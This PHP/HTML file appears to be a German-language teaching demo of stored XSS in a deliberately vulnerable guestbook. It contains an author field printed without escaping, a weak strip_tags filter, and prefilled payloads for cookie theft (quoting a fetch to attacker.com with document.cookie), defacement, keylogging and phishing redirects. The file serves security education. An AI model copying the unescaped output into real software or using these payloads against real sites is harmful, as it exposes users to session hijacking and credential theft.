<?php

error_reporting(E_ALL);

// add the class-name of your Guestbook implementation 
$GB_CLASS_IMPL = 'GuestbookDemoImpl';
require_once $GB_CLASS_IMPL . '.php';

require_once 'Guestbook.php';
require_once 'GuestbookEntry.php';

$gb = new $GB_CLASS_IMPL;
$entries = getEntries($gb);

function getEntries(Guestbook $gb) {
    return $gb->getAllEntries();
}

?>
<!DOCTYPE html>
<html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Guestbook - XSS Demo</title>
        <link rel="stylesheet" href="guestbook.css">
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📝 Guestbook</h1>
                <p class="implementation-info">Implementation: <?php echo get_class($gb); ?></p>
            </div>

            <div class="main-layout">
                <div class="left-column">
                    <div class="source-code-section">
                        <button onclick="toggleSourceCode(); return false;" class="btn-source-code">📄 Quellcode anzeigen</button>
                    </div>
                    <div class="entries-container">

            <?php
            foreach ($entries as $e) {
                $msg = strip_tags($e->getMessage(), '<b><p><u><i>'); // <u onmouseover="javascrip:alert('xss attack');">Lorem ipsum ...</u>
                $author = $e->getAuthor(); // <script>alert('xss attack');</script>
                $email = htmlspecialchars($e->getEmail());
                $date = htmlspecialchars($e->getEntryDate());
                echo <<<EOT
                <div class="gbentry">
                    <div class="gbentry-message">$msg</div>
                    <div class="gbentry-meta">
                        <span class="gbentry-author">$author</span>
                        <span class="gbentry-email">&lt;$email&gt;</span>
                        <span class="gbentry-date">$date</span>
                    </div>
                </div>
EOT;
            }
            ?>
                    </div>
                </div>

                <div class="right-column">
                    <div class="demo-section">
                <h3>🔒 XSS Demo Links</h3>
                <p class="demo-description">Klicken Sie auf einen der folgenden Links, um vorgefertigte Formulareinträge auszuwählen und verschiedene XSS-Angriffe zu testen:</p>
                <div class="demo-links">
                    <a href="clearsession.php" class="demo-link reset">Angriffsdaten löschen</a>
                    <a href="#" onclick="xssAttackName(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">XSS Username</div>
                            <div class="xss-type-badge stored">Stored XSS</div>
                        </div>
                        <div class="demo-link-actions">
                            <button onclick="showPayloadCode('xssAttackName'); event.stopPropagation(); return false;" class="btn-view-code" title="Code anzeigen">👁️</button>
                            <span class="attack-status success">Erfolgreich</span>
                        </div>
                    </a>
                    <a href="#" onclick="xssAttackMessageStripOk(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">XSS Message (strip_tags OK)</div>
                            <div class="xss-type-badge stored">Stored XSS</div>
                        </div>
                        <div class="demo-link-actions">
                            <button onclick="showPayloadCode('xssAttackMessageStripOk'); event.stopPropagation(); return false;" class="btn-view-code" title="Code anzeigen">👁️</button>
                            <span class="attack-status blocked">Verhindert</span>
                        </div>
                    </a>
                    <a href="#" onclick="xssAttackMessageStripFail(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">XSS Message (strip_tags FAIL)</div>
                            <div class="xss-type-badge stored">Stored XSS</div>
                        </div>
                        <div class="demo-link-actions">
                            <button onclick="showPayloadCode('xssAttackMessageStripFail'); event.stopPropagation(); return false;" class="btn-view-code" title="Code anzeigen">👁️</button>
                            <span class="attack-status success">Erfolgreich</span>
                        </div>
                    </a>
                    <a href="#" onclick="xssAttackMessageStripHtmlSCIsSafe(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">XSS htmlspecialchars is safe</div>
                            <div class="xss-type-badge stored">Stored XSS</div>
                        </div>
                        <div class="demo-link-actions">
                            <button onclick="showPayloadCode('xssAttackMessageStripHtmlSCIsSafe'); event.stopPropagation(); return false;" class="btn-view-code" title="Code anzeigen">👁️</button>
                            <span class="attack-status blocked">Verhindert</span>
                        </div>
                    </a>
                    <a href="#" onclick="xssAttackCookieStealing(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">Cookie Stealing</div>
                            <div class="xss-type-badge stored">Stored XSS - Advanced</div>
                        </div>
                        <div class="demo-link-actions">
                            <button onclick="showPayloadCode('xssAttackCookieStealing'); event.stopPropagation(); return false;" class="btn-view-code" title="Code anzeigen">👁️</button>
                            <span class="attack-status success">Erfolgreich</span>
                        </div>
                    </a>
                    <a href="#" onclick="xssAttackDefacement(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">Defacement (Seite überschreiben)</div>
                            <div class="xss-type-badge stored">Stored XSS - Advanced</div>
                        </div>
                        <div class="demo-link-actions">
                            <button onclick="showPayloadCode('xssAttackDefacement'); event.stopPropagation(); return false;" class="btn-view-code" title="Code anzeigen">👁️</button>
                            <span class="attack-status success">Erfolgreich</span>
                        </div>
                    </a>
                    <a href="#" onclick="xssAttackKeylogger(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">Keylogger</div>
                            <div class="xss-type-badge stored">Stored XSS - Advanced</div>
                        </div>
                        <div class="demo-link-actions">
                            <button onclick="showPayloadCode('xssAttackKeylogger'); event.stopPropagation(); return false;" class="btn-view-code" title="Code anzeigen">👁️</button>
                            <span class="attack-status success">Erfolgreich</span>
                        </div>
                    </a>
                    <a href="#" onclick="xssAttackRedirect(); return false;" class="demo-link">
                        <div class="demo-link-content">
                            <div class="demo-link-title">Redirect (Phishing)</div>
                            <div class="xss-type-badge stored">Stored XSS - Advanced</div>
                        </div>
                        <div class="demo-link-actions">
                            <button onclick="showPayloadCode('xssAttackRedirect'); event.stopPropagation(); return false;" class="btn-view-code" title="Code anzeigen">👁️</button>
                            <span class="attack-status success">Erfolgreich</span>
                        </div>
                    </a>
                </div>
                    </div>

                    <div class="form-section">
                <h2>Neuer Eintrag</h2>
                <form action="add.php" method="post" name="gbform" accept-charset="utf-8">
                    <div class="form-group">
                        <label for="yourname">
                            Name <span class="security-note">(unsafe)</span>
                        </label>
                        <input type="text" name="yourname" id="yourname" maxlength="255" class="form-control" />
                    </div>

                    <div class="form-group">
                        <label for="email">
                            Email <span class="security-note">(htmlspecialchars)</span>
                        </label>
                        <input type="text" name="email" id="email" maxlength="255" class="form-control" />
                    </div>

                    <div class="form-group">
                        <label for="message">
                            Nachricht <span class="security-note">(strip_tags($msg, '&lt;b&gt;&lt;p&gt;&lt;u&gt;&lt;i&gt;'))</span>
                        </label>
                        <textarea name="message" id="message" class="form-control"></textarea>
                    </div>

                    <div class="form-buttons">
                        <button type="submit" class="btn btn-primary">Absenden</button>
                        <button type="reset" class="btn btn-secondary">Zurücksetzen</button>
                    </div>
                </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- Payload Code Viewer Modal -->
        <div id="payloadCodeModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 id="payloadModalTitle">XSS Payload Code</h2>
                    <span class="close" onclick="closePayloadModal()">&times;</span>
                </div>
                <div class="modal-body">
                    <p class="source-explanation">Der injizierte Code wird in die Formularfelder eingetragen:</p>

                    <div class="payload-section">
                        <h3 class="payload-field-title">Name-Feld:</h3>
                        <pre class="payload-code"><code id="payloadName"></code></pre>
                    </div>

                    <div class="payload-section">
                        <h3 class="payload-field-title">Email-Feld:</h3>
                        <pre class="payload-code"><code id="payloadEmail"></code></pre>
                    </div>

                    <div class="payload-section">
                        <h3 class="payload-field-title">Nachricht-Feld:</h3>
                        <pre class="payload-code"><code id="payloadMessage"></code></pre>
                    </div>
                </div>
            </div>
        </div>

        <!-- Source Code Modal -->
        <div id="sourceCodeModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2>📄 Guestbook Quellcode (index.php)</h2>
                    <span class="close" onclick="toggleSourceCode()">&times;</span>
                </div>
                <div class="modal-body">
                    <p class="source-explanation">Kritische Stellen sind farblich hervorgehoben:</p>
                    <pre class="source-code"><code><span class="code-comment">// Zeile 40-44: Ausgabe der Gästebucheinträge</span>
foreach ($entries as $e) {
    <span class="code-unsafe">$msg = strip_tags($e->getMessage(), '&lt;b&gt;&lt;p&gt;&lt;u&gt;&lt;i&gt;');</span>  <span class="code-comment">// ⚠️ TEILWEISE UNSICHER!</span>
    <span class="code-unsafe">$author = $e->getAuthor();</span>  <span class="code-comment">// ❌ UNSICHER - Kein Escaping!</span>
    <span class="code-safe">$email = htmlspecialchars($e->getEmail());</span>  <span class="code-comment">// ✓ SICHER</span>
    <span class="code-safe">$date = htmlspecialchars($e->getEntryDate());</span>  <span class="code-comment">// ✓ SICHER</span>
    echo "&lt;div class='gbentry'&gt;";
    echo "  &lt;div class='gbentry-message'&gt;<span class="code-unsafe">$msg</span>&lt;/div&gt;";
    echo "  &lt;div class='gbentry-meta'&gt;";
    echo "    &lt;span&gt;<span class="code-unsafe">$author</span>&lt;/span&gt;";  <span class="code-comment">// ❌ XSS möglich!</span>
    echo "    &lt;span&gt;$email&lt;/span&gt;";
    echo "  &lt;/div&gt;";
    echo "&lt;/div&gt;";
}

<span class="code-comment">// Probleme:</span>
<span class="code-comment">// 1. $author wird NICHT escaped → XSS möglich</span>
<span class="code-comment">// 2. strip_tags() entfernt Tags, aber NICHT Event-Handler wie onmouseover</span>
<span class="code-comment">// 3. Erlaubte Tags (&lt;u&gt;, &lt;i&gt;, etc.) können für XSS missbraucht werden</span>

<span class="code-comment">// Lösung:</span>
<span class="code-safe">$author = htmlspecialchars($e->getAuthor());</span>  <span class="code-comment">// ✓ Macht es sicher!</span>
<span class="code-safe">$msg = htmlspecialchars($e->getMessage());</span>  <span class="code-comment">// ✓ Alternative: Alles escapen</span></code></pre>
                </div>
            </div>
        </div>

        <script>
            // Payload Code Viewer Functions
            function showPayloadCode(attackFunction) {
                // Call the attack function to populate form fields
                window[attackFunction]();

                // Get the values from form fields
                var nameValue = document.forms.gbform.elements.yourname.value;
                var emailValue = document.forms.gbform.elements.email.value;
                var messageValue = document.forms.gbform.elements.message.value;

                // Set modal title
                var titles = {
                    'xssAttackName': 'XSS Username',
                    'xssAttackMessageStripOk': 'XSS Message (strip_tags OK)',
                    'xssAttackMessageStripFail': 'XSS Message (strip_tags FAIL)',
                    'xssAttackMessageStripHtmlSCIsSafe': 'XSS htmlspecialchars is safe',
                    'xssAttackCookieStealing': 'Cookie Stealing',
                    'xssAttackDefacement': 'Defacement',
                    'xssAttackKeylogger': 'Keylogger',
                    'xssAttackRedirect': 'Redirect (Phishing)'
                };
                document.getElementById('payloadModalTitle').textContent = titles[attackFunction] + ' - Code Ansicht';

                // Apply syntax highlighting
                document.getElementById('payloadName').textContent = nameValue;
                document.getElementById('payloadEmail').textContent = emailValue;
                document.getElementById('payloadMessage').textContent = messageValue;

                // Highlight script tags and HTML
                highlightPayload('payloadName');
                highlightPayload('payloadEmail');
                highlightPayload('payloadMessage');

                // Show modal
                document.getElementById('payloadCodeModal').style.display = 'block';
            }

            function highlightPayload(elementId) {
                var element = document.getElementById(elementId);
                var code = element.textContent;

                // Simple syntax highlighting
                code = code.replace(/&/g, '&amp;')
                          .replace(/</g, '&lt;')
                          .replace(/>/g, '&gt;');

                // Highlight script tags
                code = code.replace(/(&lt;script&gt;|&lt;\/script&gt;)/g, '<span class="code-tag">$1</span>');

                // Highlight HTML tags
                code = code.replace(/(&lt;[a-z\/][^&]*&gt;)/gi, '<span class="code-tag">$1</span>');

                // Highlight strings
                code = code.replace(/'([^']*)'/g, '<span class="code-string">\'$1\'</span>');
                code = code.replace(/"([^"]*)"/g, '<span class="code-string">"$1"</span>');

                // Highlight keywords
                code = code.replace(/\b(function|var|if|alert|document|window|setTimeout|fetch|addEventListener)\b/g, '<span class="code-keyword">$1</span>');

                element.innerHTML = code;
            }

            function closePayloadModal() {
                document.getElementById('payloadCodeModal').style.display = 'none';
            }

            function toggleSourceCode() {
                var modal = document.getElementById('sourceCodeModal');
                if (modal.style.display === 'block') {
                    modal.style.display = 'none';
                } else {
                    modal.style.display = 'block';
                }
            }

            // Close modal when clicking outside
            window.onclick = function(event) {
                var sourceModal = document.getElementById('sourceCodeModal');
                var payloadModal = document.getElementById('payloadCodeModal');

                if (event.target == sourceModal) {
                    sourceModal.style.display = 'none';
                }
                if (event.target == payloadModal) {
                    payloadModal.style.display = 'none';
                }
            }

            function xssAttackName() {
                document.forms.gbform.elements.yourname.value = "<script>alert('XSS im Namen!');<\/script>";
                document.forms.gbform.elements.email.value = "angreifer@example.com";
                document.forms.gbform.elements.message.value = "Erfolgreiche XSS-Angriff (Typ 2 / persistent) über das Namen-Feld. Das Script-Tag wird direkt ausgeführt, da der Name NICHT escaped wird!";
            }
            function xssAttackMessageStripOk() {
                document.forms.gbform.elements.yourname.value = "Harmloser User";
                document.forms.gbform.elements.email.value = "user@example.com";
                document.forms.gbform.elements.message.value = "Versuch: XSS über Nachricht mit <script>alert('XSS');<\/script> - Wird durch strip_tags() entfernt und ist daher SICHER.";
            }
            function xssAttackMessageStripFail() {
                document.forms.gbform.elements.yourname.value = "Cleverer Angreifer";
                document.forms.gbform.elements.email.value = "hacker@example.com";
                document.forms.gbform.elements.message.value = "<u onmouseover=\"javascript:alert('XSS via Event-Handler!');\">Fahre mit der Maus über diesen Text!<\/u> Das <u>-Tag ist erlaubt, aber strip_tags() entfernt NICHT die Event-Handler wie onmouseover!";
            }
            function xssAttackMessageStripHtmlSCIsSafe() {
                document.forms.gbform.elements.yourname.value = "Erfolgloser Angreifer";
                document.forms.gbform.elements.email.value = "test@example.com <script>alert('XSS');<\/script>";
                document.forms.gbform.elements.message.value = "Versuch: XSS über Email-Feld. htmlspecialchars() wandelt < und > in HTML-Entities um, daher ist dies SICHER.";
            }
            function xssAttackCookieStealing() {
                document.forms.gbform.elements.yourname.value = "<script>alert('Cookie Stealing Demo:\\n\\nCookies: ' + document.cookie + '\\n\\nIn einem echten Angriff würden diese Daten an einen Angreifer-Server gesendet:\\nfetch(\\'http://attacker.com/steal.php?c=\\' + document.cookie)');<\/script>";
                document.forms.gbform.elements.email.value = "advanced-attacker@evil.com";
                document.forms.gbform.elements.message.value = "ADVANCED: Cookie-Stealing Angriff. In einem echten Szenario würde das Script die Session-Cookies des Opfers an einen Angreifer-Server senden. Dies ermöglicht Session Hijacking!";
            }
            function xssAttackDefacement() {
                document.forms.gbform.elements.yourname.value = "<script>setTimeout(function() { document.body.innerHTML = '<div style=\"background:#000;color:#0f0;padding:50px;text-align:center;font-size:3em;font-family:monospace;\"><h1>DEFACED!</h1><p>Diese Seite wurde gehackt!</p><p style=\"font-size:0.5em;margin-top:30px;\">Demo: Komplettes Überschreiben der Seite durch XSS</p></div>'; }, 5000);<\/script>";
                document.forms.gbform.elements.email.value = "defacer@hacker.evil";
                document.forms.gbform.elements.message.value = "ADVANCED: Defacement-Angriff. Nach 5 Sekunden wird die komplette Seite überschrieben (document.body.innerHTML). Angreifer können so gefälschte Inhalte, Propaganda oder Phishing-Formulare anzeigen.";
            }
            function xssAttackKeylogger() {
                document.forms.gbform.elements.yourname.value = "<script>var keys = []; document.addEventListener('keypress', function(e) { if (e.target.id === 'keyloggerDemo') { keys.push(e.key); if (keys.length >= 20) { alert('Keylogger Demo:\\n\\nGespeicherte Tastatureingaben: ' + keys.join('') + '\\n\\nIn einem echten Angriff würden diese an einen Server gesendet.'); keys = []; } } });<\/script><div style='background:#ffe5e5;padding:15px;margin-top:10px;border-radius:6px;border-left:4px solid #e53e3e;'><strong style='color:#c53030;'>⚠️ Keylogger aktiv - Tippen Sie hier:</strong><textarea id='keyloggerDemo' placeholder='Geben Sie hier Text ein (wird nach 20 Zeichen aufgezeichnet)...' style='width:100%;height:100px;margin-top:10px;padding:12px;border:2px solid #e53e3e;border-radius:6px;font-size:1em;font-family:inherit;'></textarea></div>";
                document.forms.gbform.elements.email.value = "keylogger@spy.evil";
                document.forms.gbform.elements.message.value = "ADVANCED: Keylogger-Angriff. Ein Event-Listener zeichnet alle Tastatureingaben auf. Tippen Sie im eingefügten Textfeld - nach 20 Zeichen wird eine Demo-Alert mit den aufgezeichneten Daten angezeigt. In der Realität würden Passwörter, Kreditkartendaten etc. an einen Angreifer-Server gesendet.";
            }
            function xssAttackRedirect() {
                document.forms.gbform.elements.yourname.value = "<script>if(confirm('Redirect Demo:\\n\\nNach dem Absenden wird die Seite zum GISH GitHub-Repository weitergeleitet.\\n\\nIn einem echten Angriff würde dies zu einer Phishing-Seite führen!\\n\\nFortfahren?')) { setTimeout(function() { window.location.href = 'https://github.com/carstenlucke/gish'; }, 3000); }<\/script>";
                document.forms.gbform.elements.email.value = "phisher@redirect.evil";
                document.forms.gbform.elements.message.value = "ADVANCED: Redirect/Phishing-Angriff. Nach 3 Sekunden wird der User auf eine andere Seite umgeleitet (window.location.href). Angreifer nutzen dies für Phishing: User landet auf gefälschter Login-Seite und gibt dort seine Credentials ein.";
            }
        </script>
    </body>
</html>